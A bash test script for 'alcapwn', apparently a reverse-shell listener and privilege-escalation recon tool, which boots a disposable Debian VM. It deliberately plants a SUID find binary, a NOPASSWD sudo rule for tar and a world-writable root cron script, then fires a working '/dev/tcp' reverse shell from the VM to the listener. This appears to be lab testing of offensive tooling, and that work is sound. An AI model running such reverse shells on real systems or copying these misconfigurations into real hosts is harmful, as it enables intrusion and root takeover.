#!/usr/bin/env bash
# tests/vm/run_test.sh
#
# Spins up a Debian 12 VM with staged privesc scenarios and runs alcapwn against it.
# Cleans up the overlay and VM on exit — base image is never modified.
#
# Dependencies: qemu-system-x86_64, cloud-localds (cloud-image-utils), ssh, wget
# Usage: ./tests/vm/run_test.sh

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

BASE_URL="https://cloud.debian.org/images/cloud/bookworm/latest/debian-12-generic-amd64.qcow2"
BASE_IMG="$SCRIPT_DIR/base.qcow2"
OVERLAY="$SCRIPT_DIR/overlay.qcow2"
INIT_ISO="$SCRIPT_DIR/init.iso"
SSH_KEY="$SCRIPT_DIR/test_key"
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=3 -o LogLevel=ERROR -i $SSH_KEY"
SSH_PORT=2222
ALCAPWN_PORT=4444
VM_USER="testuser"
VM_PID=""
ALCAPWN_PID=""

# ── Cleanup ───────────────────────────────────────────────────────────────────

cleanup() {
    echo ""
    echo "[*] Cleaning up..."
    [ -n "$ALCAPWN_PID" ] && kill "$ALCAPWN_PID" 2>/dev/null || true
    [ -n "$VM_PID" ]      && kill "$VM_PID"      2>/dev/null || true
    rm -f "$OVERLAY" "$INIT_ISO"
    echo "[*] Done."
}
trap cleanup EXIT INT TERM

# ── Dependencies ──────────────────────────────────────────────────────────────

check_deps() {
    local missing=()
    for cmd in qemu-system-x86_64 cloud-localds ssh ssh-keygen wget go; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    if [ ${#missing[@]} -gt 0 ]; then
        echo "[!] Missing dependencies: ${missing[*]}"
        echo "    sudo apt install qemu-system-x86 cloud-image-utils"
        exit 1
    fi
}

# ── Base image ────────────────────────────────────────────────────────────────

get_base_image() {
    if [ -f "$BASE_IMG" ]; then
        echo "[*] Base image already present: $BASE_IMG"
        return
    fi
    echo "[*] Downloading Debian 12 cloud image (~600MB)..."
    wget -q --show-progress -O "$BASE_IMG.tmp" "$BASE_URL"
    mv "$BASE_IMG.tmp" "$BASE_IMG"
    echo "[+] Base image downloaded"
}

# ── SSH key ───────────────────────────────────────────────────────────────────

ensure_ssh_key() {
    if [ ! -f "$SSH_KEY" ]; then
        echo "[*] Generating test SSH key..."
        ssh-keygen -t ed25519 -f "$SSH_KEY" -N "" -C "alcapwn-test" -q
    fi
}

# ── cloud-init ISO ────────────────────────────────────────────────────────────

create_init_iso() {
    local pubkey
    pubkey=$(cat "$SSH_KEY.pub")

    cat > /tmp/alcapwn-user-data << USERDATA
#cloud-config
hostname: alcapwn-test
manage_etc_hosts: true

users:
  - name: $VM_USER
    sudo: ALL=(ALL) NOPASSWD:ALL
    groups: users, sudo
    shell: /bin/bash
    ssh_authorized_keys:
      - $pubkey
    lock_passwd: false
USERDATA

    cat > /tmp/alcapwn-meta-data << METADATA
instance-id: alcapwn-test-01
local-hostname: alcapwn-test
METADATA

    cloud-localds "$INIT_ISO" /tmp/alcapwn-user-data /tmp/alcapwn-meta-data
    rm -f /tmp/alcapwn-user-data /tmp/alcapwn-meta-data
}

# ── VM ────────────────────────────────────────────────────────────────────────

start_vm() {
    # Thin overlay — base image stays untouched
    qemu-img create -f qcow2 -b "$BASE_IMG" -F qcow2 "$OVERLAY" -q

    qemu-system-x86_64 \
        -enable-kvm -cpu host -smp 2 -m 1G \
        -drive file="$OVERLAY",if=virtio,format=qcow2 \
        -drive file="$INIT_ISO",if=ide,media=cdrom \
        -netdev user,id=net0,hostfwd=tcp::${SSH_PORT}-:22 \
        -device virtio-net-pci,netdev=net0 \
        -nographic -serial null -monitor none \
        2>/dev/null &
    VM_PID=$!
    echo "[*] VM started (PID $VM_PID)"
}

wait_for_ssh() {
    echo "[*] Waiting for VM to boot..."
    for i in $(seq 1 60); do
        if ssh $SSH_OPTS "$VM_USER@localhost" -p "$SSH_PORT" true 2>/dev/null; then
            echo "[+] VM is up"
            return
        fi
        sleep 3
    done
    echo "[!] Timed out waiting for SSH"
    exit 1
}

# ── Privesc scenarios ─────────────────────────────────────────────────────────
#
# What gets staged and what alcapwn should detect:
#
#   /usr/bin/find SUID        → SUID_GTFOBINS:  find
#   tar NOPASSWD sudo         → SUDO_NOPASSWD_CUSTOM: tar
#   ALL NOPASSWD sudo         → SUDO_NOPASSWD_DIRECT  (already set by cloud-init)
#   /etc/cron.daily/clean.sh  → WRITABLE_CRON: clean.sh  (world-writable)

setup_privesc() {
    echo "[*] Staging privesc scenarios..."
    ssh $SSH_OPTS "$VM_USER@localhost" -p "$SSH_PORT" bash << 'SETUP'
set -e

# SUID_GTFOBINS: find
sudo chmod u+s /usr/bin/find

# SUDO_NOPASSWD_CUSTOM: tar
echo 'testuser ALL=(root) NOPASSWD: /usr/bin/tar' | sudo tee /etc/sudoers.d/tar > /dev/null

# WRITABLE_CRON: clean.sh
printf '#!/bin/bash\nfind /tmp -mtime +7 -delete\n' | sudo tee /etc/cron.daily/clean.sh > /dev/null
sudo chmod 777 /etc/cron.daily/clean.sh

echo "Done"
SETUP
    echo "[+] Privesc scenarios configured"
}

# ── alcapwn ───────────────────────────────────────────────────────────────────

start_alcapwn() {
    echo "[*] Starting alcapwn on port $ALCAPWN_PORT..."
    cd "$REPO_ROOT/v2"
    go build -o "$REPO_ROOT/v2/alcapwn" "$REPO_ROOT/v2/" 2>/dev/null || true
    "$REPO_ROOT/v2/alcapwn" -l "0.0.0.0:$ALCAPWN_PORT" > /tmp/alcapwn-vm-test.log 2>&1 &
    ALCAPWN_PID=$!
    sleep 1
}

fire_reverse_shell() {
    echo "[*] Firing reverse shell from VM..."
    # 10.0.2.2 is the QEMU NAT gateway — the host from the VM's perspective
    ssh $SSH_OPTS "$VM_USER@localhost" -p "$SSH_PORT" \
        "nohup bash -c 'bash -i >& /dev/tcp/10.0.2.2/$ALCAPWN_PORT 0>&1' >/dev/null 2>&1 &"
}

wait_for_recon() {
    echo "[*] Waiting for recon to complete (up to 3 min)..."
    for i in $(seq 1 60); do
        sleep 3
        grep -q "Findings saved" /tmp/alcapwn-vm-test.log 2>/dev/null && return
    done
    echo "[!] Timed out waiting for recon"
}

# ── Main ──────────────────────────────────────────────────────────────────────

main() {
    check_deps
    get_base_image
    ensure_ssh_key
    create_init_iso
    start_vm
    wait_for_ssh
    setup_privesc
    start_alcapwn
    fire_reverse_shell
    wait_for_recon

    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo " ALCAPWN TEST OUTPUT"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    cat /tmp/alcapwn-vm-test.log

    # Verify expected matches appeared
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo " EXPECTED MATCHES"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    local all_pass=true
    local log=/tmp/alcapwn-vm-test.log

    check_match() {
        local label="$1" pattern="$2"
        if grep -q "$pattern" "$log" 2>/dev/null; then
            echo "  [PASS] $label"
        else
            echo "  [FAIL] $label"
            all_pass=false
        fi
    }

    check_match "SUDO_NOPASSWD_DIRECT (ALL)"     "SUDO_NOPASSWD_DIRECT"
    check_match "SUDO_NOPASSWD_CUSTOM (tar)"     "tar"
    check_match "SUID_GTFOBINS (find)"           "find"
    check_match "WRITABLE_CRON (clean.sh)"       "clean.sh"

    echo ""
    if $all_pass; then
        echo "  All expected matches found."
        exit 0
    else
        echo "  Some matches missing — check output above."
        exit 1
    fi
}

main "$@"
